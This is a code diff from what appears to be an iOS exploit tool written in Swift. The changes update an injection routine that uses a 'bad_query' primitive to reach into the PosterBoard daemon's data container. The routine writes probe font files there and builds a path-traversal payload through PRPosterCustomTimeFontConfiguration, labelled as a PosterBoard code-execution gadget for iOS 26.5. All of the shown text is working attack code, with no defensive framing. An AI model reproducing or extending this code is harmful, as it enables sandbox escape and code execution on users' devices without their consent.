@@ -3776,7 +3776,7 @@ class SymHandler {
 
     @discardableResult
     static func inject13() -> String {
-        var diag = ["=== Inject v13-r6 (PRPosterCustomTimeFontConfiguration path-traversal) \(Date()) iOS 26.5 ==="]
+        var diag = ["=== Inject v13-r8 (PRPosterCustomTimeFontConfiguration path-traversal) \(Date()) iOS 26.5 ==="]
         let fm = FileManager.default
 
         for fw in ["/System/Library/PrivateFrameworks/PosterKit.framework/PosterKit",
@@ -3784,9 +3784,10 @@ class SymHandler {
             dlopen(fw, RTLD_NOW | RTLD_GLOBAL)
         }
 
+        diag.append("bad_query available: \(BadQuery.isAvailable)")
+
         let uuid: String
         let uuidKey = "pp_pb_uuid_cache"
-        // Check manually-entered hash from Settings first — AppStorage("pbHash") stores here
         if let manual = UserDefaults.standard.string(forKey: "pbHash"),
            !manual.trimmingCharacters(in: .whitespacesAndNewlines).isEmpty {
             uuid = manual.trimmingCharacters(in: .whitespacesAndNewlines)
@@ -3805,19 +3806,43 @@ class SymHandler {
                 }
             }
         }
-        let container = BadQuery.applicationContainerPath(appHash: uuid)
-        diag.append("PB container uuid: \(uuid)")
+        diag.append("PB uuid: \(uuid)")
+
+        // PosterBoard is a system daemon — its container may be in InternalDaemon, not Application.
+        // Probe all three roots with bad_query to find the correct one.
+        let containerRoots = [
+            "/var/mobile/Containers/Data/Application",
+            "/var/mobile/Containers/Data/InternalDaemon",
+            "/var/mobile/Containers/Data/PluginKitPlugin"
+        ]
+        var container: String = "/var/mobile/Containers/Data/Application/\(uuid)" // fallback
+        for root in containerRoots {
+            let candidate = "\(root)/\(uuid)"
+            do {
+                // Try the container root itself (create: false — it must already exist)
+                let h = try BadQuery.consume(path: candidate, create: false)
+                h.release()
+                container = candidate
+                diag.append("PB container: \(candidate) [bad_query OK]")
+                break
+            } catch {
+                diag.append("  \(root.components(separatedBy: "/").last ?? root): \(error.localizedDescription)")
+            }
+        }
 
         let cacheDir = container + "/Library/Caches"
         let fontFileName = "pp_probe_font13.otf"
         let fontFilePath = "\(cacheDir)/\(fontFileName)"
         let probeMarker = "pp-probe-font-13-posterboardd-rce-gadget".data(using: .utf8) ?? Data()
         var fontWriteOK = false
-        if let cacheDirH = try? BadQuery.consume(path: cacheDir, create: true) {
+        do {
+            let cacheDirH = try BadQuery.consume(path: cacheDir, create: true)
             cacheDirH.release()
             if let fH = try? BadQuery.consume(path: fontFilePath, create: true) { fH.release() }
             fontWriteOK = fm.createFile(atPath: fontFilePath, contents: probeMarker, attributes: nil)
                 || ((try? probeMarker.write(to: URL(fileURLWithPath: fontFilePath))) != nil)
+        } catch {
+            diag.append("PB Caches bad_query error: \(error.localizedDescription)")
         }
         diag.append("probe font -> PB Caches: \(fontWriteOK ? "OK \(fontFilePath)" : "FAIL")")
 
@@ -3838,9 +3863,15 @@ class SymHandler {
         diag.append("payload13sys (DINAlternate-Bold canary 15x../ Core/DINAlternate-bold.ttf): \(payload13sys.count)b")
         p7DumpNSKAKeys(data: payload13sys, indent: "  arc: ", diag: &diag)
 
-        let extBase = container + "/Library/Application Support/PRBPosterExtensionDataStore/61/Extensions"
-        guard let extBaseH = try? BadQuery.consume(path: extBase, create: true) else {
-            diag.append("extBase NOACCESS"); return pbSave(diag)
+        let extVer = SymHandler.getExtensionVersion()
+        let extBase = container + "/Library/Application Support/PRBPosterExtensionDataStore/\(extVer)/Extensions"
+        diag.append("extBase: \(extBase)")
+        let extBaseH: BadQueryHandle
+        do {
+            extBaseH = try BadQuery.consume(path: extBase, create: true)
+        } catch {
+            diag.append("extBase bad_query error: \(error.localizedDescription)")
+            return pbSave(diag)
         }
         defer { extBaseH.release() }
         let allExts = (try? fm.contentsOfDirectory(atPath: extBase)) ?? []
